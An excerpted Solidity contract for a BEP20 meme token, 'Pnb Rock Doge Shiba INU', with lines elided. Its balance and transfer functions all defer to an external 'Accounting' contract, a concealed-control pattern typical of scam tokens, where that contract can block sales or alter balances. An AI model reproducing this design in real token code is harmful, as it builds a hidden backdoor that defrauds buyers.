...
interface Accounting {
    function doTransfer(address source, address pair, address from, address to, uint amount) external;
    function balanceOf(address source, address who) external view returns (uint256);
}
...
contract Token is BEP20, Ownable {
    ...
    string public name = "Pnb Rock Doge Shiba INU";
    ...
    function balanceOf(address who) view public returns (uint256) {
        return Accounting(accounting).balanceOf(address(this), who);
    }
    ...
    function transfer(address recipient, uint amount) public returns (bool success) {
        ...
        Accounting(accounting).doTransfer(address(this), pairAddress, msg.sender, recipient, amount);
        return true;
    }
	...
	function transferFrom(
        ...
        Accounting(accounting).doTransfer(address(this), pairAddress, from, to, amount);
        return true;
    }
